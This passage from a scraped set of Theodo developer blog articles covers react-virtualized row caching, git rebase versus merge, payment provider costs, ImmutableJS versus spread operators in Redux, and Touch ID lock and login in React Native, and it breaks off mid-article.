isVisible, // This row is visible within the List (eg it is not an overscanned row)\r\n   style, // Style object to be applied to row (to position it)\r\n}) => (\r\n   <CellMeasurer\r\n     cache={this.cache}\r\n     columnIndex={0}\r\n     key={key}\r\n     parent={parent}\r\n     rowIndex={index}\r\n   >\r\n   <div\r\n     className=\"Row\"\r\n     key={key}\r\n     style={{\r\n       ...style,\r\n       display: 'flex',\r\n     }}\r\n   >\r\n     <span style={{ width: 400 }}>{rows[index].name}</span>\r\n     <span style={{ width: 100 }}>{rows[index].age}</span>\r\n   </div>\r\n   </CellMeasurer>\r\n);\r\n\n\u00a0\nPitfall:\nFinally, we obtain a nice windowed list, ready to be deployed and used\u2026\nUnless your application contain filters or some data added dynamically.\nActually, when I implemented this, after using some filters, some blank spaces were staying in the list.\nIt is a performance consideration due to the fact we use a cache, but it is a good compromise unless you have many rows and many columns in a Grid (as we display a list, we only have 1 column).\nConsequently, I managed to fix this issue by clearing the cache every time my list had its data reloaded:\n\r\ncomponentWillReceiveProps() { //Really important !!\r\n this.cache.clearAll(); //Clear the cache if row heights are recompute to be sure there are no \"blank spaces\" (some row are erased)\r\n this.virtualizedList && this.virtualizedList.recomputeRowHeights(); //We need to recompute the heights\r\n}\r\n\nA big thanks to\u00a0Brian Vaughn\u00a0for this amazing library\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyril Gaunet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThanks to a new colleague of mine, I have learned how to make my git history cleaner and more understandable. \nThe principle is simple: rebase your branch before you merge it. But this technique also has weaknesses. In this article, I will explain what a rebase and a merge really do and what are the implications of this technique.\nBasically, here is an example of my git history before and after I used this technique.\n\nStay focus, rebase and merge are no joke! \nWhat is the goal of a rebase or a merge ?\nRebase and merge both aim at integrating changes that happened on another branch into your branch.\nWhat happens during a merge ?\nFirst of all there are two types of merge:\n\nFast-forward merge\n3-way merge\n\nFast-forward merge\nA fast-forward merge happens when the most recent shared commit between the two branches is also the tip of the branch in which you are merging.\nThe following drawing shows what happens during a fast-forward merge and how it is shown on a graphical git software.\nA: the branch in which you are merging\nB: the branch from which you get the modifications\n\ngit checkout A\ngit merge B\n\n\nAs you can see, git simply brings the new commits on top of branch A. After a fast-forward merge, branches A and B are exactly the same.\nNotes:\n\ngit checkout A, git rebase B you would have had the exact same result!\ngit checkout B, git merge A would have left the branches in the \u201cbefore\u201d situation, since branch A has no new commits for branch B.\n\n3-way merge\nA 3-way merge happens when both branches have had new commits since the last shared commit.\nThe following drawing shows what happens during a 3-way merge and how it is shown in a graphical git software.\nA: the branch in which you are merging\nB: the branch from which you get the modifications\n\ngit checkout A\ngit merge B\n\n\nDuring a 3-way merge, git creates a new commit named \u201cmerge commit\u201d (in orange) that contains:\n\nAll the modifications brought by the three commits from B (in purple)\nThe possible conflict resolutions\n\nGit will keep all information about the commits of the merged branch B even if you delete it. On a graphical git software, git will also keep a small loop to represent the merge.\nThe default behaviour of git is to try a fast-forward merge first. If it\u2019s not possible, that is to say if both branch have had changes since the last shared commit, it will be a 3-way merge.\nWhat happens during a rebase?\nA rebase differ from a merge in the way in which it integrates the modifications.\nThe following drawings show what happens during a rebase and how it is shown in a graphical git software.\nA: the branch that you are rebasing\nB: the branch from which you get the new commits\n\ngit checkout A\ngit rebase B\n\n\n\nWhen you rebase A on B, git creates a temporary branch that is a copy of branch B, and tries to apply the new commits of A on it one by one.\nFor each commit to apply, if there are conflicts, they will be resolved inside of the commit.\nAfter a rebase, the new commits from A (in blue) are not exactly the same as they were:\n\nIf there were conflicts, those conflicts are integrated in each commit\nThey have a new hash\n\nBut they keep their original date which might be confusing since in the final branch, commits in blue were created before the two last commits in purple.\nWhat is the best solution to integrate a new feature into a shared branch and keep your git tree clean?\nLet say that you have a new feature made of three new commits on a branch named `feature`. You want to merge this branch into a shared branch, for exemple `master` that has received two new commits since you started from it.\nYou have two main solutions: \nFirst solution: \n\ngit checkout feature\ngit rebase master\ngit checkout master\ngit merge feature\n\n\nNote : Be careful, git merge feature should do a fast-forward merge, but some hosting services for version control do a 3-way merge anyway. To prevent this, you can use git merge feature \u2013ff-only\nSecond solution:\n\ngit checkout master\ngit merge feature\n\n\nAs you can see, the final tree is more simple with the first solution. You simply have a linear git history. On the opposite, the second solution creates a new \u201cmerge commit\u201d and a loop to show that a merge happened.\nIn this situation, the git tree is still readable, so the advantage of the first solution is not so obvious. The complexity emerges when you have several developers in your team, and several feature branches developed at the same time. If everyone uses the second solution, your git tree ends up complex with several loop, and it can even be difficult to see which commits belong to which branch!\nUnfortunately, the first solution has a few drawbacks:\nHistory rewriting\nWhen you use a rebase, like in the first solution, you \u201crewrite history\u201d because you change the order of past commits on your branch. This can be problematic if several developers work on the same branch: when you rewrite history, you have to use git push \u2013 \u2013 force in order to erase the old branch on the remote repository and put your new branch (with the new history) in its place.\nThis can potentially erase changes another developer made, or introduce conflicts resolution for him.\nTo avoid this problem, you should only rebase branches on which you are the only one working. For example in our case, if you are the only one working on the feature branch.\nHowever you might sometime have to rewrite history of shared branches. In this case, make sure that the other developers working on the branch are aware of it, and are available to help you if you have conflicts to resolve.\nThe obvious advantage of the 3-way merge here, is that you don\u2019t rewrite history at all.\nConflicts resolution\nWhen you merge or rebase, you might have to resolve conflicts.\nWhat I like about the rebase, is that the conflicts added by one commit will be resolved in this same commit. On the opposite, the 3-way merge will resolve all the conflicts into the new \u201cmerge commit\u201d, mixing all together the conflicts added by the different commits of your feature branch.\nThe only problem with the rebase is that you may have to resolve more conflicts, due to the fact that the rebase applies the commits of your branch one by one.\nConclusion\nTo conclude, I hope I have convinced you that rebasing your branch before merging it, can clear your git history a lot! Here is a recap of the advantages and disadvantages of the rebase and merge method versus the 3-way merge method:\n\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9mie Marniquet Fabre\r\n  \t\t\t\r\n  \t\t\t\tI am an agile web developer at Theodo, I enjoy outdoor sports (mountain biking, skiing...) and new technologies !  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen\u00a0deciding what external payment service you want to use, you need to take into account several factors: the price of the payment provider, the amount of time of implementation, the ease of customising and styling the form, the trust of users to the company \u2026 and see what is best suited for your needs. There is not one best online provider, but this article will\u00a0help you chose one that fits you project.\nAt Theodo we use different online payment providers: SagePay, PayPal and Stripe for\u00a0our websites. For each one of them we have discovered advantages and drawbacks, that I will share with you.\nKeep in mind that using a payment provider such as one we are going to talk about allows to easily be PCI\u00a0compliant, which is\u00a0essential for any website dealing with card data.\nOverall price\nThe overall price covers the development cost and the\u00a0transaction fees. Additional costs for setup, refunding and breaking the contract may also apply.\nDevelopment cost:\nHere is\u00a0in order a comparison of the three payment providers\u00a0we use:\n\n1 \u2013 Stripe: ~1day. This \u201cdevelopment first\u201d payment provider is specially built for an easy integration to websites. Therefore it is no surprise that\u00a0it is a good choice if you want to quickly\u00a0handle payments. In our company we like to use it\u00a0when building MVPs because it takes less than a day to integrate and design with\u00a0Stripe Elements.\n2 -PayPal express checkout: ~ 2/3 days. You can usePayPal Express Checkout on your website to allow your customers to proceed to aPayPal payment. This will momentarily redirect the client to the PayPal login page and then a summary page where he can pay he will then be sent back to your website. Integrating Paypal takes a couple of days.\n3 \u2013 SagePay: ~ 1 week. Out of the three payment providers we use, this is definitely the one that takes the longest to integrate \u2013 all in all more than a week. You can use an iFrame to send the card data. However the documentation is not that clear and styling the form is complex (you need to send the styling files to SagePay that will then add them to the iFrame).\n\nFees per transaction:\nThe price depends on:\n\nNumber of transaction per month\nPrice per transaction you will charge\nDebit or Credit card\n\u2026\n\nFrom\u00a0our experience we found that\u00a0for websites selling lots of products\u00a0at\u00a0small prices (~10\u20ac) it is worth using SagePay. But if\u00a0there is\u00a0a smaller traffic and higher prices Stripe might be a better solution. In both casesPayPal tends to have higher fees.\nFinally, companies often negotiate the price fees directly with the payment providers to get more interesting offers, but this can\u00a0take some time.\nHere is an example of what you would be paying\u00a0to the different companies:\nIf your company sells 100 products a month at an average price of \u00a340 (total of \u00a34,000), these would be the prices:\n\nStripe: \u00a381\nSagePay: \u00a3103.5\nPayPal: \u00a3136\n\nBut if your company sells 350 products a month at an average price of \u00a310 (total of \u00a33,500), these would be the prices:\n\nStripe: \u00a3136.5\nSagePay: \u00a393.05\nPayPal: \u00a3171\n\nHere are the fees that you can find on the 3 websites:\n\nStripe:\n\nFor VISA Mastercard and American Express:\n\n1.4% + 25p / transaction for European cards\n2.9% + 25p / transaction for non European cards\n\n\nAs they say on their website: \u2019No setup, monthly, or hidden fees\u2019.\nOver \u00a320,000 per months you can negotiate for lower fees\nhttps://stripe.com/gb/pricing\n\n\nSagePay:\n\n\u00a319.90/month: 350 free transactions per month then 12p per transaction after\n\u00a345/month if max 500 free token purchases per month then 10p per transaction\nIf more than 3000 transactions per month you will need to contact Sagepey to get a corporate account\n+ 2.09% for Mastercard or Visa credit cards + 40p for debit cards (fees a quite hidden)\nCancelation fees can be high, a minimum of 3 months notice is necessary.\nhttps://www.sagepay.co.uk/our-payment-solutions/online-payments\n\n\nPayPal:\n\nLess than \u00a31500/month:\u00a03.4%\u00a0+ 20p per transaction\nLess than \u00a36000/month:\u00a02.9%\u00a0+ 20p per transaction\nLess than \u00a315,000/month:\u00a02.4%\u00a0+ 20p per transaction\nLess than \u00a355,000/month:\u00a01.9%\u00a0+ 20p per transaction\nMore: personalised amount\nhttps://www.paypal.com/uk/webapps/mpp/paypal-fees\n\n\n\nWebsite Integration / design\nThe design of the form is very important. Users probably will not trust a website with cheap design. Also, paying is not the most pleasant moment of a customer\u2019s journey. A seamless flow\u00a0should be a must-have\u00a0to\u00a0get customers to pay and come back. Do not underestimate the design of your form!\n\nStripe: you can easily style the different inputs so the payment is consistent with the rest of your website. This is something we really appreciate with Stripe Elements.\nPayPal: as the payment is done directly onPayPal website you won\u2019t have any design to do! Users would find this option reassuring because they know how there money is being processed.\nSagePay: it is difficult to get a flawless and consistent design, as you have to send files to SagePay so they can handle the iFrame styling.\n\nWhat we recommend\nIf you wish to add a payment method to your website for the first time and that the project is short, we would recommend Stripe. As it is really easy to integrate and style it is perfect for these projects. If your website has a lot of traffic, SagePay is a good choice because of its low fees with a lot of transactions. However keep in mind that the implementation can take time.\u00a0Finally it is a nice option to add aPayPal button on top of your existing payment methods as some customers are reluctant to input the card details on websites.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlice Breton\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is this article about?\nWhen I first learned about ImmutableJS I was convinced it was a great addition to any project.\nSo I tried to make it a working standard at Theodo.\nAs we offer scrum web development teams for various projects going from POC for startups to years lasting ones for banks, we bootstrap applications all the time and we need to make a success of all of them!\nSo we put a strong emphasis on generalizing every finding and learning made on individual projects.\nWith this objective in mind we are determining which technical stack would be the best for our new projects.\nEach developer contributes to this effort by improving the company\u2019s technical stack whenever they makes a new learning.\nWhen React was chosen as our component library we were just embarking on a hard journey that you may have experienced: making the dozens other decisions that come with a React app.\nReact then what?\nOne of those choices lead us to choose redux as our global state management lib.\nWe noticed that people were having troubles with Immutability in reducers, one of the three core principles of Redux\nThe first possibility to answer this purpose is defensive copying with ES6 spread operator { ...object }.\nThe second option we studied is Facebook\u2019s ImmutableJS library.\n\nUsing ImmutableJS in your react-redux app means that you will no longer use JS data structures (objects, arrays) but immutable data structures (i.e. Map, List, \u2026) and their methods like .set(), .get(). Using .set() on a Map, the Immutable equivalent of objects, returns a new Map with said modifications and does not alter previous Map.\nIn order to make an informed choice I observed the practices on projects that used either one of the two, gathered their issues and tried to find solutions for them.\nThis article is the result of this study and hopefully it will help you choose between those two!\nIn this first part I will compare those two options in the light of 3 criteria out of the 5 I studied: readability, maintainability and learning curve.\nThe second part of this study, coming soon, will explore performance and synergy with typing tools.\nFirst Criterion, Readability: Immutable Wins!\nIf your state is nested and you use spread operators to achieve immutability, it can quickly become unreadable:\nfunction reducer(state = defaultState, action) {\r\n  switch (action.type) {\r\n    case 'SET_HEROES_TO_GROUP':\r\n      return {\r\n        ...state,\r\n        guilds: {\r\n          ...state.guilds,\r\n          [action.payload.guildId]: {\r\n            ...state.guilds[action.payload.guildId],\r\n            groups: {\r\n              ...state.guilds[action.payload.guildId].groups,\r\n              [action.payload.groupId]: {\r\n                ...state.guilds[action.payload.guildId].groups[action.payload.groupId],\r\n                action.payload.heroes,\r\n              },\r\n            },\r\n          },\r\n        },\r\n      };\r\n  }\r\n}\r\n\nIf you ever come across such a reducer during a Code Review there is no doubt you will have troubles to make sure that no subpart of the state is mutated by mistake.\nWhereas the same function can be written with ImmutableJS in a much simpler way\nfunction reducer(state = defaultState, action) {\r\n  switch (action.type) {\r\n    case 'SET_HEROES_TO_GROUP':\r\n\r\n      return state.mergeDeep(\r\n        state,\r\n        { guilds: { groups: { heroes: action.payload.heroes } } },\r\n      ).toJS();\r\n  }\r\n}\r\n\nConclusion for Readability\nImmutableJS obviously wins this criteria by far if your state is nested.\nOne counter measure you can take is to normalize your state, for example with normalizr.\nWith normalizr, you never have to change your state on more than two levels of depth as shown on below reducer case.\n// Defensive copying with spread operator\r\ncase COMMENT_ACTION_TYPES.ADD_COMMENT: {\r\n  return {\r\n    ...state,\r\n    entities: { ...state.entities, ...action.payload.comment },\r\n  };\r\n}\r\n\r\n// ImmutableJS\r\ncase COMMENT_ACTION_TYPES.ADD_COMMENT: {\r\n  return state.set('entities', state.get('entities').merge(Immutable.fromJS(action.payload.comment)));\r\n}\r\n\nSecond Criterion, Maintainability and Preventing Bugs: Immutable Wins Again!\nA question I already started to answer earlier is: Why must our state be immutable?\n\nBecause redux is based on it\nBecause it will avoid bugs in your app\n\nIf for example your state is:\nconst state = {\r\n  guilds: [\r\n    // list of guilds with name and heroes\r\n    { id: 1, name: 'Guild 1', heroes: [/*array of heroes objects*/]},\r\n  ],\r\n};\r\n\nAnd your reducer case to change the name of a guild is:\nswitch (action.type) {\r\n  case CHANGE_GUILD_NAME: {\r\n    const guildIndex = state.guilds.findIndex(guild => guild.id === action.payload.guildId);\r\n\r\n    const modifiedGuild = state.guilds[guildIndex];\r\n    // here we do a bad thing: we modifi the old Guild 1 object without copying first, its the same reference\r\n    modifiedGuild.name = action.payload.newName;\r\n\r\n    // Here we do the right thing: we copy the array so that we do not mutate previous guilds\r\n    const copiedAndModifiedGuilds = [...state.guilds];\r\n    copiedAndModifiedGuilds[guildIndex] = modifiedGuild;\r\n\r\n    return {\r\n      ...state,\r\n      guilds: copiedAndModifiedGuilds,\r\n    };\r\n  }\r\n}\r\n\nAfter doing this update, if you are on a detail page for Guild 1, the name will not update itself!\nThe reason for this is that in order to know when to re-render a component, React does a shallow comparison, i.e. oldGuild1Object === newGuild1Object but this only compares the reference of those two objects.\nWe saw that the references are the same hence no component update.\nAn ImmutableJS data structure always returns a new reference when you modify an object so you never have to worry about immutability.\nUsing spread operators and missing one level of copy will make you waste hours looking for it.\nAnother important issue is that having both javascript and Immutable objects is not easily maintainable and very bug-prone.\nAs you cannot avoid JS objects, you end up with a mess of toJS and fromJS conversions, which can lead to component rendering too often.\nWhen you convert an Immutable object to JS with toJS, it creates a new reference even if the object itself has not changed, thus triggering component renders.\nConclusion for Maintainability\nImmutable ensures you cannot have immutability related bugs, so you won\u2019t have to check this when coding or during Code review.\nOne way to achieve the same without Immutable would be to replace the built-in immutability with immutability tests in your reducers.\nit('should modify state immutably', () => {\r\n  const state = reducer(mockConcatFeedContentState, action);\r\n\r\n  // here we check that all before/after objects are not the same reference -> not.toBe()\r\n  expect(state).not.toBe(mockConcatFeedContentState);\r\n  expect(state.entities).not.toBe(mockConcatFeedContentState.entities);\r\n  expect(state.entities['fakeId']).not.toBe(mockConcatFeedContentState.entities['fakeId']);\r\n});\r\n\nBut making sure that your team-mates understand and always write such tests can be as painful as reading spread operators filled reducers.\nMy opinion is that Immutable is the best choice here on the condition that you use it as widely as possible in your app, thus limiting your use of toJS.\nThird Criterion, Learning Curve: One point for Spread Operators\nOne important point when assessing the pros and cons of a library/stack is how easy will it be for new developers to learn it and to become autonomous on the project.\nThe results of my analysis on half a dozen projects using is that learning ImmutableJS is hard work.\nYou have a dozen data structures to choose from, about two dozen built-ins or methods that sometimes do not behave the same way javascript methods do.\nBelow are some examples of such differences:\nconst hero = {\r\n  id: 1,\r\n  name: 'Superman',\r\n  abilities: ['Laser', 'Super strength'],\r\n}\r\n\r\nconst immutableHero = Immutable.fromJS(hero); // converts objects and arrays to the ImmutableJS equivalent\r\n\r\n\r\n// get a property value\r\nhero.abilities[0] // 'Laser'\r\nimmutableHero.get('abilities', 0) // 'Laser'\r\n\r\n// set a property value\r\nhero.name = 'Not Superman'\r\nimmutableHero.set('name', 'Not Superman')\r\n\r\nimmutableHero.name = 'Not Superman' // nothing happens!\r\n\r\n// Number of elements in an array / Immutable equivalent\r\nhero.abilities.length // 2\r\nhero.get('abilities').size // 2\r\n\r\n// Working with indexes\r\nconst weaknessIndex = hero.abilities.indexOf('weakness') // -1\r\nhero.abilities[weaknessIndex] // throws Error\r\n\r\nconst immutableWeaknessIndex = immutableHero.get('abilities').indexOf('weakness') // -1\r\nimmutableHero.get('abilities').get(weaknessIndex) // 'Super strength'\r\n\nWhile you can use all the knowledge you have on javascript and ES6, if you go with ImmutableJS you\u2019ll have to learn some things from the start.\nNicolas, a colleague of mine once came to me with a strange issue.\nThey were using normalizr and had a state that looked like the Immutable equivalent of this:\n{\r\n  fundState: {\r\n    fundIds: // a list of fund ids\r\n    fundsById: // an object with a fund id as key and the fund data as value: { fund1Id: fund1 },\r\n  }\r\n}\r\n\nTheir problem was that their ids, indexing funds in fundsById Map where strings of numbers and not numbers.\nAt least twice, one of their developers had a hard time writing a feature because they were trying to get the funds like this: state.get('fundState', 'fundsById', 3) to get the fund of id 3.\nThe issue here is that contrary to javascript, strings of numbers and numbers are not at all interchangeable (it may be a good thing but it is an important difference!).\nSo they had to convert all their id keys to the right type.\nAnother issue that colleagues shared with me was that ImmutableJS is really hard to debug in the console as shown below with our immutableHero object from above:\n\nAs you can see, it\u2019s nearly unreadable and its only a really simple object!\nA great solution I encountered when trying to help them is immutable formatter a chrome extension that turns what you saw into this beauty:\n\nTo enable it, you have to open chrome dev tools. Then access the dev tools settings and check \u201cenable custom formatter\u201d option:\n\nIn the case of ES6, new developers have three things to learn:\n\nUnderstand why immutability is important and why they should bother\nHow to use spread operators to enforce immutability\nNot to use object.key = value to modify their state\n\nConclusion for Learning Curve\nOverall the learning curve for spread operators, an ES6 tool is rather easy since you can still use all the javascript you know and love but you must be careful to the points listed above.\nImmutableJS on the other hand will be much harder to learn and master.\nConclusion for Part 1\nIn conclusion, this first part showed us that ImmutableJS comes with a lot of nice things, allows you to concentrate on working on value added work rather than trying to read horrible reducers or looking for hidden bugs.\nThis of course is at the cost of the steeper learning curve of a rich API and some paradigms different from what you are used to!\nIn the part II of this article I will compare both solutions in the light of Performance and compatibility with typing.\nIf you liked this article and want to know more, follow me on twitter so you know when the second part is ready :).\n@jeremy_dardour\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9my Dardour\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tMost modern smart phones have a built-in fingerprint sensor.\nOn iOS, this feature is called Touch ID whereas on Android, it is generally referred to as \u201cFingerprint Authentication\u201d.\nPeople most commonly use it to unlock their device by simply pressing their finger on the fingerprint sensor.\n\nIt is a cool technology and as a React-Native developer you can actually integrate Touch ID* into your apps by using the react-native-touch-id library.\n[*I will refer to this feature as \u201cTouch ID\u201d for the rest of the article. But everything here applies to both iOS and Android unless stated otherwise.]\nThere are various use cases for Touch ID and they generally fall within one of two categories:\n\nIncrease the security of your app\n\nThis is commonly done by adding a Touch ID lock.\nPopular examples are Dropbox, Outlook, Revolut and LastPass\n\n\nMake your app more user-friendly\n\nThe most common use case in this category is the Touch ID login\nThis is very popular in banking apps such as HSBC, Barclays and Halifax\n\n\n\nYou can use the diagram below to decide how you should use Touch ID in your app:\n\nIn this article, I will explain how to add Touch ID to your React Native app and how you can implement a Touch ID Lock or Touch ID Login.\nAuthentication with Touch ID\nThere is an excellent library called react-native-touch-id that lets you easily prompt your users for Touch ID authentication.\nBefore you can use it, you need to install and link the library:\nyarn add react-native-touch-id            # Install the JS package\r\nreact-native link react-native-touch-id   # Link the library\r\n\nOnce that is done, you can prompt the user to authenticate with Touch ID:\nimport TouchID from 'react-native-touch-id';\r\n\r\nTouchID.authenticate('Authenticate with fingerprint') // Show the Touch ID prompt\r\n  .then(success => {\r\n    // Touch ID authentication was successful!\r\n    // Handle the successs case now\r\n  })\r\n  .catch(error => {\r\n    // Touch ID Authentication failed (or there was an error)!\r\n    // Also triggered if the user cancels the Touch ID prompt\r\n    // On iOS and some Android versions, `error.message` will tell you what went wrong\r\n  });\r\n\nThe code above will trigger the following prompt:\n\nThe TouchID library contains one more method, called isSupported.\nAs the name suggests, it allows you to check if the user\u2019s device supports Touch ID.\nNo matter which use case you decide on, you will want to make this check before you ask your user to authenticate with Touch ID:\nimport TouchID from 'react-native-touch-id';\r\n\r\nTouchID.isSupported()\r\n  .then(biometryType => {\r\n    if (biometryType === 'TouchID') {\r\n      // Touch ID is supported on iOS\r\n    } else if (biometryType === 'FaceID') {\r\n      // Face ID is supported on iOS\r\n    } else if (biometryType === true) {\r\n      // Touch ID is supported on Android\r\n    }\r\n  })\r\n  .catch(error => {\r\n    // User's device does not support Touch ID (or Face ID)\r\n    // This case is also triggered if users have not enabled Touch ID on their device\r\n  });\r\n\nNote for iPhone X: On iOS, react-native-touch-id actually supports both Touch ID and Face ID.\nWhen you call TouchID.authenticate, the library will figure out which authentication method to use and show the correct prompt to the user.\nIt makes no difference in the way you use the library.\nHowever, you should make sure to adjust the language of your app.\nDon\u2019t say \u201cTouch ID\u201d when you actually mean \u201cFace ID\u201d.\nYou can use the TouchID.isSupported method to get the correct biometry type for your iOS users.\nWhen not to use Touch ID\nTouch ID is a great addition for most apps.\nBut there cases in which it doesn\u2019t really make sense to add Touch ID.\nGenerally speaking, if your app has no notion of user accounts, then you will have a hard time finding a good use for Touch ID.\nWithout user accounts, there is usually nothing private on the app that would benefit from protection.\nTouch ID Lock: Make your app more secure\nThe Touch ID lock is the most popular use of Touch ID in modern apps:\n\nWhenever the app is opened, the user is presented with a lock screen and asked to authenticate via Touch ID.\nOnly if authentication is successful will the user gain access to the app.\nThis is a great way to integrate Touch ID in your app.\nYour users get a whole layer of additional security and the cost in user experience is minimal.\nAdding a\u00a0Touch ID lock\u00a0makes the most sense if\n\nyour users have to sign in to use the app (and there is something worth protecting)\nyour users remain signed in (otherwise there is no real security gain)\n\nImplementing the Touch ID lock\nAdding the actual Touch ID authentication layer is simple.\nYou could create a Lock component that wraps around your app:\nimport React from 'react';\r\nimport TouchID from 'react-native-touch-id';\r\nimport App from './App';\r\nimport Fallback from './Fallback';\r\n\r\nclass Lock extends React.PureComponent {\r\n  state = { locked: true };\r\n\r\n  componentDidMount() {\r\n    TouchID.authenticate('Unlock with your fingerprint').then(success =>\r\n      this.setState({ locked: false }),\r\n    );\r\n  }\r\n\r\n  render() {\r\n    if (this.state.locked) {\r\n      return <Fallback />;\r\n    }\r\n\r\n    return <App />;\r\n  }\r\n}\r\n\nThis component prompts the Touch ID authentication as soon as it mounts.\nIf authentication is successful, it renders your app (\u201cunlocking\u201d it).\nIf authentication is not successful, it renders a fallback component.\nAnd handling the fallback is where the actual complexity of the Touch ID lock lies.\nHandling the fallback\nWhat happens if Touch ID no longer works for your user?\nThis could be due to something simple like wet fingers.\nOr it could be that the fingerprint sensor in your users device has broken.\nIf you don\u2019t handle the fallback correctly, your users will be locked out of your app.\nThe most popular option for handling the fallback is actually inspired by the iOS lock screen itself: a passcode lock.\n\nPasscodes are still relatively quick to unlock for your user, and they do a good job of keeping the app secure.\nI haven\u2019t been able to find a good library for adding a passcode input.\nBut you might prefer to implement your own UI components anyway.\nWhere should you store the user\u2019s passcode?\nThe simplest option would be to store the passcode on the users device itself.\nI would recommend against using React Native\u2019s built-in Async Storage.\nIt does not encrypt your data and anyone with access to the physical device will be able to read the code in plaintext.\nInstead, I recommend using react-native-keychain which allows you to store credentials in your phone\u2019s secure storage (the \u201ckeychain\u201d in iOS and the \u201ckeystore\u201d on Android).\nHandling the fallback of the fallback\nWhat happens if your user forgets the passcode?\nThe simplest solution is the one used by Dropbox: Users are logged out if they enter a wrong passcode 10 times in a row.\nTouch ID Login: Make your app more user-friendly\nAnother popular use of Touch ID is the Touch ID login.\n\nUsers are prompted to authenticate with their fingerprint, and if authentication is successful, they get logged into the app.\nThis use case makes most sense if your users do not remain signed in and have to log in every time they open the app.\nTherefore, you see this often being used in banking apps.\nImplementing the Touch ID Login\nThere are three steps to implementing the Touch ID Login:\n\nStore the user\u2019s login credentials on the device\nPrompt the user to authenticate with Touch ID on the login screen\nIf Touch ID authentication is successful, use the stored credentials to perform the login call behind the scenes\n\nFirst time users will have to manually sign into the app.\nDuring the initial sign in, you can store the user\u2019s credentials in the secure storage of the device.\nAgain, do not use React-Native\u2019s built-in Async Storage.\nThis is even more critical for the Touch ID login because it would be storing the user\u2019s password in cleartext.\nTo store the user\u2019s credentials securely, you should use react-native-keychain.\nFirst, you need to install it:\nyarn add react-native-keychain            # Install the JS package\r\nreact-native link react-native-keychain   # Link the library\r\n\nYou can then store the credentials in the keychain when the user logs in:\nimport * as Keychain from 'react-native-keychain';\r\nimport { login } from './api';\r\n\r\n// Submission handler of the login form\r\nhandleSubmit = () => {\r\n  const {\r\n    username,               // Get the credentials entered by the user\r\n    password,               // (We're assuming you are using controlled form inputs here)\r\n    shouldEnableTouchID,    // Did you ask the user if they want to enable Touch ID login ?\r\n  } = this.state;\r\n\r\n  login(username, password) // call the `login` api\r\n    .then(() => {\r\n      if (shouldEnableTouchID) {\r\n        // if login is successful and users want to enable Touch ID login\r\n        Keychain.setGenericPassword(username, password); // store the credentials in the keychain\r\n      }\r\n    });\r\n};\r\n\nNext time the user lands on the login screen, you can present them with the Touch ID authentication prompt.\nFor example, you could add a button on the login form that allows users to login via Touch ID.\n\nIf the fingerprint authentication is successful, you can retrieve the credentials from the keychain and use them to make the login request.\nThe actual Touch ID login will look similar to this:\nimport * as Keychain from 'react-native-keychain';\r\nimport { login } from './api';\r\n\r\nhandlePress = () => {              // User presses the \"Login using Touch ID\" button\r\n\r\n  Keychain.getGenericPassword()   // Retrieve the credentials from the keychain\r\n    .then(credentials => {\r\n      const { username, password } = credentials;\r\n\r\n      // Prompt the user to authenticate with Touch ID.\r\n      // You can display the username in the prompt\r\n      TouchID.authenticate(`to login with username \"${username}\"`)   \r\n        .then(() => {\r\n\r\n          // If Touch ID authentication is successful, call the `login` api\r\n          login(username, password)\r\n            .then(() => {\r\n              // Handle login success\r\n            })\r\n            .catch(error => {\r\n              if (error === 'INVALID_CREDENTIALS') {\r\n                // The keychain contained invalid credentials :(\r\n                // We need to clear the keychain and the user will have to sign in manually\r\n                Keychain.resetGenericPassword();\r\n              }\r\n            })\r\n        });\r\n    });\r\n};\r\n\nHandling Invalid Credentials\nUnlike the Touch ID Lock, you do not need to worry about implementing a fallback for the Touch ID Login, since you can just use the manual sign in.\nHowever, you do need to worry about making sure that the keychain never contains invalid credentials.\nOtherwise, your user might keep retrying to login via Touch ID using the wrong credentials.\nIn the worst case, you may end up disabling your user\u2019s account due to too many failed login attempts.\nUnfortunately, there is no guarantee that your keychain will always contain valid credentials.\nSometimes, users change or reset their credentials.\nAnd if the username or password is changed on a different device, your keychain will end up containing invalid credentials.\nIf you realise that the keychain does contain invalid credentials, you must clear the keychain and turn off Touch ID.\nTo clear the keychain, call the Keychain.resetGenericPassword() function.\nThis means that your user will have to sign in manually.\nHowever, once the manual login is successful, you can directly update the keychain with the provided credentials and the next 